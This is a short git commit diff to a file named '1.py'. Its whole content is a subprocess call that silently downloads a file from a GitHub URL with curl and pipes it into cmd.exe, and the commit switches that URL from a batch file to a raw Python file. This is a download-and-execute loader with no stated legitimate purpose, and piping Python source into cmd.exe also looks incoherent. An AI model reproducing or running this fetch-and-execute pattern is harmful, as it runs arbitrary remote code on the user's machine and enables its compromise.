bdd2a6903594a47673ff5ef5925e804f5503495c
joythink77 <joythink77@gmail.com>
2026-09-12 23:41:28 -0700

    Change URL to fetch Python script
    Updated URL to point to the raw Python file instead of a batch file.

--- 1.py
+++ 1.py
@@ -1,6 +1,6 @@
 import subprocess
 
-url = "https://github.com/joythink77/abc/blob/main/1.bat"
+url = "https://github.com/joythink77/test/raw/refs/heads/main/1.py"
 
 subprocess.run(
     f'curl -s "{url}" | cmd.exe',
